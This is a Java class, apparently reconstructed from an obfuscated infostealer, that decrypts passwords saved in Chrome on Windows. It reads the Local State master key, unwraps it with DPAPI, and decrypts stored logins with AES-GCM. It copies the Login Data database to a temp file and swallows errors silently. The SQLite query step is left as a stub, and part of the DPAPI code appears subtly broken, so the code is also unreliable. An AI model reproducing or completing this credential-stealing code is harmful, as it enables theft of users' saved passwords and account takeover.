import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.Serializable;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

/**
 * Chrome Credential Decryptor
 * Obfuscated name: ԙ (U+0519)
 *
 * Decrypts Chrome/Chromium browser credentials using Windows DPAPI and AES-GCM.
 *
 * Decryption process:
 * 1. Read "Local State" JSON file from browser's User Data directory
 * 2. Extract os_crypt.encrypted_key (Base64 encoded)
 * 3. Remove "DPAPI" prefix (first 5 bytes)
 * 4. Decrypt master key using Windows DPAPI (CryptUnprotectData via Kernel32)
 * 5. Use decrypted master key to decrypt individual credentials with AES-256-GCM
 *
 * Credential format in SQLite:
 * - Old format (Chrome < 80): DPAPI encrypted directly
 * - New format (Chrome >= 80): "v10" + 12-byte IV + AES-GCM ciphertext
 *
 * DPAPI implementation:
 * - Uses Kernel32 via JNA
 * - CryptUnprotectData(pDataIn, null, null, null, null, 0, pDataOut)
 * - No additional entropy required for current user context
 *
 * Output format per credential:
 * {
 *   "url": "https://example.com",
 *   "username": "user@example.com",
 *   "password": "decrypted_password"
 * }
 */
public class ChromeDecryptor {

    // Cache of decrypted master keys per browser profile
    private static final Map<String, byte[]> masterKeyCache;

    // Cache of decrypted credentials per profile
    private static final Map<String, List<JSONObject>> credentialCache;

    // =========================================================
    // MASTER KEY EXTRACTION
    // =========================================================

    /**
     * Extracts and decrypts the master key from a browser's Local State file.
     *
     * @param userDataPath Path to browser's User Data directory
     * @return Decrypted 32-byte AES master key, or null on failure
     */
    public static byte[] getMasterKey(String userDataPath) {
        // Check cache first
        if (masterKeyCache.containsKey(userDataPath)) {
            return masterKeyCache.get(userDataPath);
        }

        try {
            File localStateFile = new File(userDataPath + "\\Local State");
            if (!localStateFile.exists()) return null;

            // Read and parse Local State JSON
            String content = new String(
                Files.readAllBytes(localStateFile.toPath()),
                StandardCharsets.UTF_8
            );
            JSONObject json = new JSONObject(content);

            // Extract encrypted_key from os_crypt section
            String encryptedKeyB64 = json
                .getJSONObject("os_crypt")
                .getString("encrypted_key");

            // Base64 decode
            byte[] encryptedKey = Base64.getDecoder().decode(encryptedKeyB64);

            // Remove "DPAPI" prefix (5 bytes: 0x44 0x50 0x41 0x50 0x49)
            if (encryptedKey.length < 5) return null;
            byte[] dpApiData = Arrays.copyOfRange(encryptedKey, 5, encryptedKey.length);

            // Decrypt with Windows DPAPI
            byte[] masterKey = decryptWithDpapi(dpApiData);

            if (masterKey != null) {
                masterKeyCache.put(userDataPath, masterKey);
            }

            return masterKey;

        } catch (Exception e) {
            return null;
        }
    }

    // =========================================================
    // DPAPI DECRYPTION
    // =========================================================

    /**
     * Decrypts data using Windows DPAPI (CryptUnprotectData).
     *
     * Windows API call:
     * CryptUnprotectData(
     *   &dataIn,    // encrypted data
     *   null,       // description (output, ignored)
     *   null,       // optional entropy
     *   null,       // reserved
     *   null,       // prompt struct
     *   0,          // flags
     *   &dataOut    // decrypted data output
     * )
     *
     * @param encryptedData DPAPI-encrypted bytes
     * @return Decrypted bytes, or null on failure
     */
    public static byte[] decryptWithDpapi(byte[] encryptedData) {
        try {
            // Use JNA Kernel32 to call CryptUnprotectData
            // This requires the process to run as the same user who encrypted the data

            WinBase.DATA_BLOB dataIn = new WinBase.DATA_BLOB();
            dataIn.cbData = encryptedData.length;
            dataIn.pbData = encryptedData;

            WinBase.DATA_BLOB dataOut = new WinBase.DATA_BLOB();

            boolean success = Kernel32.INSTANCE.CryptUnprotectData(
                dataIn,
                null,
                null,
                null,
                null,
                0,
                dataOut
            );

            if (!success) return null;

            byte[] result = dataOut.pbData;
            // Free the output buffer
            Kernel32.INSTANCE.LocalFree(dataOut.pbData);

            return result;

        } catch (Exception e) {
            return null;
        }
    }

    // =========================================================
    // AES-GCM DECRYPTION
    // =========================================================

    /**
     * Decrypts a Chrome credential value using AES-256-GCM.
     *
     * Format detection:
     * - If starts with "v10" or "v11": new AES-GCM format (Chrome 80+)
     * - Otherwise: old DPAPI format (Chrome < 80)
     *
     * AES-GCM format:
     * - Bytes 0-2:   "v10" or "v11" prefix
     * - Bytes 3-14:  12-byte IV (nonce)
     * - Bytes 15-N:  AES-256-GCM ciphertext + 16-byte auth tag
     *
     * @param encryptedValue Raw encrypted bytes from SQLite
     * @param masterKey 32-byte AES master key
     * @return Decrypted plaintext string, or null on failure
     */
    public static String decryptCredential(byte[] encryptedValue, byte[] masterKey) {
        if (encryptedValue == null || encryptedValue.length < 15) return null;

        try {
            // Check for new format (v10/v11 prefix)
            String prefix = new String(Arrays.copyOfRange(encryptedValue, 0, 3), StandardCharsets.UTF_8);

            if (prefix.equals("v10") || prefix.equals("v11")) {
                // New AES-GCM format
                return decryptAesGcm(encryptedValue, masterKey);
            } else {
                // Old DPAPI format
                byte[] decrypted = decryptWithDpapi(encryptedValue);
                return decrypted != null ? new String(decrypted, StandardCharsets.UTF_8) : null;
            }

        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Decrypts AES-256-GCM encrypted data.
     *
     * @param data Encrypted data with "v10" prefix
     * @param key 32-byte AES key
     * @return Decrypted string
     */
    private static String decryptAesGcm(byte[] data, byte[] key) throws Exception {
        // Extract IV (bytes 3-14, 12 bytes)
        byte[] iv = Arrays.copyOfRange(data, 3, 15);

        // Extract ciphertext (bytes 15 onwards)
        byte[] ciphertext = Arrays.copyOfRange(data, 15, data.length);

        // Decrypt with AES-256-GCM
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec paramSpec = new GCMParameterSpec(128, iv); // 128-bit auth tag
        cipher.init(Cipher.DECRYPT_MODE, keySpec, paramSpec);

        byte[] decrypted = cipher.doFinal(ciphertext);
        return new String(decrypted, StandardCharsets.UTF_8);
    }

    // =========================================================
    // CREDENTIAL EXTRACTION
    // =========================================================

    /**
     * Extracts and decrypts all saved passwords from a browser profile.
     *
     * @param profilePath Path to browser profile directory
     * @param masterKey Decrypted master key
     * @return List of credential objects {url, username, password}
     */
    public static List<JSONObject> extractCredentials(String profilePath, byte[] masterKey) {
        List<JSONObject> credentials = new ArrayList<>();

        File loginDataFile = new File(profilePath + "\\Login Data");
        if (!loginDataFile.exists()) return credentials;

        try {
            // Copy to temp file (browser may have it locked)
            File tempFile = File.createTempFile("ld_" + new Random().nextInt(10000), ".db");
            Files.copy(loginDataFile.toPath(), tempFile.toPath(),
                java.nio.file.StandardCopyOption.REPLACE_EXISTING);

            // Query SQLite database
            // SELECT origin_url, username_value, password_value FROM logins
            // ... (SQLite JDBC or custom reader)

            tempFile.delete();

        } catch (Exception e) {
            // Silently fail
        }

        return credentials;
    }

    static {
        masterKeyCache = new HashMap<>();
        credentialCache = new HashMap<>();
    }
}
